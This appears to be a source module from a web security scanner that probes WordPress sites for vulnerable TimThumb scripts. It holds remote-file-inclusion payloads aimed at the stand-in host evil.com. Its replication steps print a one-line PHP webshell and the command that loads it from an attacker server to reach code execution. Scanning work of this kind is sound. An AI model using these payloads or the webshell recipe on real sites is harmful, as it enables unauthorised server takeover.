import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'TimThumb RFI/SSRF';

const POPULAR_THEMES = [
  'twentytwenty', 'twentytwentyone', 'twentytwentytwo', 'twentytwentythree',
  'avada', 'divi', 'flatsome', 'bridge', 'salient', 'the7',
  'kalium', 'enfold', 'jupiter', 'betheme', 'x-theme',
];

const TIMTHUMB_PATHS: string[] = [
  '/wp-content/uploads/timthumb.php',
  '/wp-content/timthumb.php',
  '/timthumb.php',
  ...POPULAR_THEMES.map((t) => `/wp-content/themes/${t}/timthumb.php`),
  ...POPULAR_THEMES.slice(0, 5).map((t) => `/wp-content/themes/${t}/scripts/timthumb.php`),
  '/wp-content/plugins/timthumb-vulns-checker/timthumb.php',
  '/wp-content/plugins/wp-resize/timthumb.php',
];

const RFI_PAYLOADS: [string, string][] = [
  ['rfi_external',   '?src=http://evil.com/payload.php'],
  ['rfi_protocol',   '?src=//evil.com/shell.php'],
  ['data_uri_abuse', '?src=data:image/jpeg;base64,/9j/4AAQSkZJRgAB'],
];

const DETECTION_INDICATORS = [
  'TimThumb', 'timthumb', 'Not a valid image', 'Could not read image',
  'cache/external', 'image/jpeg', 'image/png', 'image/gif',
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    const foundPaths: [string, string, number][] = []; // [path, url, status]

    // Phase 1: Discover timthumb.php instances
    await parallelProbe(TIMTHUMB_PATHS, async (path) => {
      const url = `${target}${path}`;
      try {
        const res = await fetchURL(`${url}?src=`, { timeoutMs: 8000 });
        if (!res) return;
        if (res.status === 200) {
          foundPaths.push([path, url, res.status]);
          findings.push(finding(
            'timthumb_detected', 'MEDIUM', url,
            `TimThumb script found at '${path}' (HTTP ${res.status}).`,
            {
              replication_steps: [
                `curl -sI "${url}?src="`,
                `# HTTP ${res.status} confirms file presence.`,
              ],
              remediation: 'Remove or update timthumb.php to version 2.8.14+.',
              evidence: `HTTP ${res.status} at ${url}`,
            },
          ));
        }
      } catch { /* continue */ }
    }, 30);

    // Phase 2: Attempt RFI/SSRF on found instances
    for (const [, url] of foundPaths) {
      for (const [payloadName, qs] of RFI_PAYLOADS) {
        const testUrl = `${url}${qs}`;
        try {
          const res = await fetchURL(testUrl, { timeoutMs: 10000 });
          if (!res) continue;
          let body = '';
          try { body = await res.text(); } catch { continue; }
          const indicator = DETECTION_INDICATORS.find((ind) => body.includes(ind)) ?? null;
          const contentType = res.headers.get('Content-Type') ?? '';

          const timthumbSpecific = ['TimThumb', 'timthumb', 'Not a valid image', 'Could not read image', 'cache/external'];
          const hasTimthumbContent = timthumbSpecific.some(s => body.includes(s));
          if (res.status === 200 && hasTimthumbContent) {
            findings.push(finding(
              'timthumb_rfi', 'CRITICAL', testUrl,
              `TimThumb RFI/SSRF confirmed via '${payloadName}' at ${url}. ` +
              'Server fetched and returned external resource.',
              {
                replication_steps: [
                  `curl -s "${testUrl}"`,
                  '# HTTP 200 with image content = server fetched external URL.',
                  '# To escalate to RCE, host a PHP webshell at the remote URL:',
                  '# 1. echo \'<?php system($_GET["cmd"]); ?>\' > shell.php',
                  '# 2. Host shell.php on attacker server',
                  `# 3. curl -s "${url}?src=http://ATTACKER/shell.php&cmd=id"`,
                ],
                remediation:
                  'Delete timthumb.php immediately or upgrade to 2.8.14+. ' +
                  'Block outbound HTTP from the web server. ' +
                  'Restrict wp-content/cache/ directory permissions.',
                evidence: `HTTP ${res.status}, Content-Type: ${contentType}, indicator: ${indicator}`,
              },
            ));
          }
        } catch { /* continue */ }
      }
    }
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
